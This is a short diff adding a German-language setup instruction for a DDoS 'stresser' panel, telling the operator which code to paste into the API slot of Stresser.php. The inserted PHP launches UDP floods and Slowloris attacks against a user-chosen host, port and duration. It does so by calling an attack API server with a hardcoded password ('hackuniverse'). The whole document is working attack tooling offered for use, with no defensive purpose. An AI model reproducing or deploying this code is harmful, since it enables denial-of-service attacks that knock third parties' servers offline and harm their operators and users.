@@ -1,0 +1,40 @@
+
+
+In der Datei Stresser.php findet ihr diese anweißung.
+=======================================================
+
+//Api Slot
+ 
+ 
+				/* Bitte Füge hier die API ein.*/
+
+
+//Api Slot End
+
+
+
+
+
+
+
+
+
+Fügt diesen Code ein:
+=========================
+
+		if($method == "UDP"){
+				@file_get_contents("http://thisserverip/api/udp.php?pass=hackuniverse&host=$host&port=$port&time=$time&packet=1000&bytes=65000");
+
+		}
+		if($method == "SLOWLORIS"){
+			//system("php api/slowloris.php get 200 $host 200 $time");	
+			@file_get_contents("http://thisserverip/api/callloris.php?server=$host&time=$time");
+
+		}
+		
+		
+		
+		
+		
+		
+
